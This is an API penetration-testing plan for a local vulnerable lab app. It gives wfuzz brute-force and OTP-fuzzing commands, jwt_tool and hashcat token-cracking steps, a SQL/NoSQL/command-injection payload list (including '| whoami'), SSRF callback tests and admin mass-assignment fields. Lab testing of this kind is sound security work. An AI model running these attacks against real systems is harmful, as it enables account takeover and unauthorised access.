> # Authentication Attacks
>
> ## TC#01 Brute force
>
>> ### 'Should be able to brute force the login page with huge wordlists'
>
> Preconditions:
>
> Install mentalist: https://github.com/sc0tfree/mentalist/wiki/Installation#linux-apt-package-manager
> Install cupp: https://github.com/Mebus/cupp
>
>
> Steps:
```
wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405
```
> Expected result:
> 
> 1. Should able to find correct usernames and passwords
> 
------------------------------------------------------------------------------------------
>
> ## TC#02 Password Spraying
>
>> ### 'Use Password Spraying to login page with short wordlists and weak passwords'
>
> Preconditions:
> 
> 1. Save the response containing an excessive data exposure as "response.json".
> 2. Pull emails from the saved JSON response and save as crapiusers file
```
grep -oe "[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z]\+" response.json > crapiusers
```
> 3. Sort unique emails and save as crapiuniq file
```
cat crapiusers | sort -u > crapiuniq
```
> 4. Create passwords short list
```
Password1
Password3
Password123
Crapi123
Summer2022! 
Spring2022! 
March212006!
Fall2021!
12345Qwert!
Dorsey@2022
``` 
>
> Steps:
> 
> 1. Burp suite: clusterbomb
> 2. Set up users and passwords lists
> 3. Run
> 4. Payload Processing: base64-encode
> 5. Ctrl-shift-b -> right click -> convert selection -> base 64 decode
>
> Expected result:
> 
> 1. Should able to find correct password
> 
------------------------------------------------------------------------------------------
>
> # Api Token Attacks
>
> ## TC#03 JWT Attacks
>
>> ### 'Password Spraying to login page with short wordlists and weak passwords'
>
> Preconditions:
> 
> Analyze JWT token
> 1. Intercept request in burp suite
> 2. Open in Sequencer
> Click on Configure and highlight the token value
> 3. Click "Start Live Capture"
> ![Burp Suite Sequencer](/docs/token_analysis/Sequencer.png "Sequencer screenshot")
>
> 4. Use jwt_tools to analyze:
>
> ![jwt_tools](/docs/token_analysis/jwt_tool.png "jwt_tool screenshot")
>
>
> Steps:
> 1. Automating JWT attacks
> Use JWT automated tool (jwt_tools)
```
jwt_tool -t http://127.0.0.1:8888/identity/api/v2/user/dashboard -rh "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9....2QKV-qv72Q" -M pb
```
> Change Algorithm value to "none":
```
jwt_tool eyJhbGciOiJ....dWIip6Ym2QKV_-qv72Q -X a
```
> 2. JWT Crack Attack
> Generate wordlist:
```
crunch 5 5 -o crapi.txt
```
> Run jwt_tools to find secret key
```
jwt_tool eyJhbGciOiJSUzI1NiJ9....2QKV-qv72Q -C -d crapis.txt
``` 
> Or run hashcat to crack secret sign
```
hashcat -a 0 -m 16500 eyJhbGyKcjHKjhw....akjF46xCpioGU0 /home/lizard/Downloads/rockyou.txt --show
```
>
> Expected result:
> 
> 1. Should able to find the secret key
> 
------------------------------------------------------------------------------------------
>
> # BOLA
>
> ## TC#04 Broken Object Level Authorization 
>
>> ### 'User should access the restricted page of another user using id parameter'
>
> Scope:
>
```
GET /identity/api/v2/videos/:id?video_id={id}`
GET /community/api/v2/community/posts/{id}`
GET /identity/api/v2/vehicle/{id}/location`
```
>
> Test Data:
> 1. name: UserA; email: userA@test.com; phone: 0112233445
> 2. name: UserB; email: userB@test.com; phone: 0112233446
>
> Steps:
>
> 1. Create a UserA account.
> 2. Use the API and discover requests that involve resource IDs as UserA.
> 3. Document requests that include resource IDs and should require authorization.
> 4. Create a UserB account.
> 5. Obtaining a valid UserB token and attempt to access UserA's resources.

>
> Expected result:
> 
> 1. UserB Should be access for userA page using id parameter
> 
------------------------------------------------------------------------------------------
>
> # BFLA
>
> ## TC#05 Broken Function Level Authorization 
>
>> ### 'Another user shouldn't be able to edit the content of another user using id'
>
> Scope:
>
```
POST /workshop/api/shop/orders/return_order?order_id={id}
POST /community/api/v2/community/posts/{id}/comment
PUT /identity/api/v2/user/videos/{id}
DELETE /identity/api/v2/user/videos/{id}
```
>
> Test Data:
> 1. name: UserA; email: userA@test.com; phone: 0112233445
> 2. name: UserB; email: userB@test.com; phone: 0112233446
>
> Steps:
>
> 1. Create a UserA account.
> 2. Add new order/post new comment/upload the video on profile page
> 3. Document requests that include resource IDs and should require authorization.
> 4. Create a UserB account.
> 5. Return order/post comment/edit video name of UserA id-content in scope.
> 6. Change the value 'user' to 'admin' in url
> 7. Delete the video of UserA
>
>
> Expected result:
> 
> 1. User Shouldn't be able to edit content on another user's page; 
> 
------------------------------------------------------------------------------------------
>
> # Improper Inventory Management
>
> ## TC#06 Improper Assets Management
>
>> ### 'Should not access to unsupported and non-production versions of an API'
>
> Scope:
>
```
GET /identity/api/{{ver}}/user/dashboard
POST /identity/api/{{ver}}/user/videos/
PUT /identity/api/{{ver}}/user/videos/
DELETE /identity/api/{{ver}}/vehicle/vehicles
POST /identity/api/{{ver}}/user/change-email
POST /identity/api/{{ver}}/user/pictures
POST /identity/api/{{ver}}/user/reset-password
POST /identity/api/auth/{{ver}}/check-otp
GET /community/api/{{ver}}/community/posts/recent
POST /community/api/{{ver}}/community/posts
GET /community/api/{{ver}}/community/posts/
POST /community/api/{{ver}}/community/posts/{{post_id}}/comment
```
>
> Test Data:
> 1. email: user@test.com; password: 12345Qwert!; otp: 'anyvalue'
>
> Steps:
>
> 1. Create a new environment variable in postman for api version {{env}}
> 2. Run the collection one by one with api1, api2, api3 value in variable
> 3. Analyze the responses in each collection with different api variable
> 4. Note that `POST /identity/api/auth/api2/check-otp` request has different response: `Invalid OTP! Please try again..`
> 5. Fuzz the request with command:
```
wfuzz -d '{"email":"user@test.com", "otp":"FUZZ","password":"12345Qwert!"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://127.0.0.1:8888/identity/api/auth/v2/check-otp --hc 500
```
> 6. Note that gives us otp number with response 200
> 7. Put received otp value in request and send the request. 
>
> Expected result:
> 
> 1. User should be able to change the password in old api by fuzzing otp request receiving correct value
> 
------------------------------------------------------------------------------------------
>
> # Mass Assignment Attacks
>
> ## TC#07 Testing Account Registration for Mass Assignment
>
>> ### 'Find the parameters where user assigns an admin permissions'
>
> Scope:
>
```
GET /identity/api/auth/signup
```
>
> Test Data:
```
"isadmin": true,
"isAdmin":"true",
"admin": 1,
"admin": true, 
"isadmin": 1,
"isAdmin":"1",
```
>
> Steps:
>
> 1. Intercept the request in Burp Suite
> 2. Brute force new key:value field in request via Burp Suite Intruder - Cluster Bomb
> 3. Start 'Param miner' extension in Burp suite:
```
Select Extensions > Param Miner > Guess params > Guess JSON parameter
```
> 
>
> Expected result:
> 
> 1. Find the parameters where user assigns an admin permissions
> 
------------------------------------------------------------------------------------------
>
> # Mass Assignment Attacks
>
> ## TC#08 User shouldn't be able to add own products 
>
>> ### 'Testing "products" page for Mass Assignment'
>
> Scope:
>
```
POST /workshop/api/merchant/contact_mechanic
POST /workshop/api/shop/orders
GET /workshop/api/shop/products
```
>
>
> Steps:
>
> 1. Intercept the request in Burp Suite
> 2. Analyze the response body
> 3. Change the values in request
> 4. Check the response
> 5. Change request method from GET to post
> 6. Check the response
> 
>
> Expected result:
> 
> 1. User shouldn't be able to add own products
> 
------------------------------------------------------------------------------------------
>
> # SSRF
>
> ## TC#08 'Server sanitize url value in request data' 
>
>> ### 'Testing requests for SSRF'
>
> Include full URLs in the POST body or parameters
> Include URL paths (or partial URLs) in the POST body or parameters
> Headers that include URLs like Referer
>
> Scope:
>
```
POST /community/api/v2/community/posts
POST /workshop/api/shop/orders/return_order?order_id=4000
POST workshop/api/merchant/contact_mechanic
```
>
>
> Steps:
>
> 1. Intercept the request in Burp Suite
> 2. Send to intruder
> 3. Change the url values in requests with 'https://webhook.site/8d149a33-49a8-4ebe-926f-891d58294d8d'
> 4. Check the response at `https://webhook.site'
> 
>
> Expected result:
> 
> 1. User could replace data in request, server sanitize request from user
> 
------------------------------------------------------------------------------------------
>
> # Injection Attacks
>
> ## TC#08 'Server sanitize url and field value in request data' 
>
>> ### 'SQL, noSQL, Command Injection fuzzing'
>
> Test data:
> sgl/nosql/command payload list:
>
```
'
''
;%00
-
-- -
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
OR 1=1/*
“or 1=1;%00
OR 1=1
admin"#
admin' --
admin" OR "1"="1
{"$gt":""}
{"$gt":-1}
{"$ne":""}
{"$ne":-1}
$nin
{"$nin":1}
| whoami
||
&
&&
"
;
'"
```
>
> Scope:
>
```
GET /identity/api/v2/user/videos/{{video_id}}
POST /workshop/api/shop/orders/return_order?order_id=4000
POST workshop/api/merchant/contact_mechanic
POST /identity/api/v2/user/change-email
POST /identity/api/auth/v2/check-otp
POST /workshop/api/shop/orders/return_order?order_id={{fuzz}}
POST /community/api/{{ver}}/community/posts
POST /community/api/{{ver}}/coupon/validate-coupon
```
>
>
> Steps:
>
> 1. Create duplicate postman collection for fuzzing
> 2. Create 'fuzz' environment variable
> 3. Assign payload from payload list to variable
> 4. Run postman collection with each value
> 5. In Burp Suite run Intruder - Sniper with payload list from test data
> 6. Run wfuzz:
```
wfuzz -z file,/usr/share/wordlists/seclists/Fuzzing/nosql.txt  -H "Authorization: Bearer eyJhbGciOiJSUz....gDojE2FWg" -H "Content-Type: application/json" -d "{\"coupon_code\":FUZZ}" http://127.0.0.1:8888/community/api/v2/coupon/validate-coupon
``` 
>
>
![Fuzzing for NoSql](/docs/Injection/noSql_Fuzzing.png "NoSql_fuzzing screenshot") 
>
> Expected result:
> 
> 1. Server sanitizes url/field inputs from user
> 
------------------------------------------------------------------------------------------
>





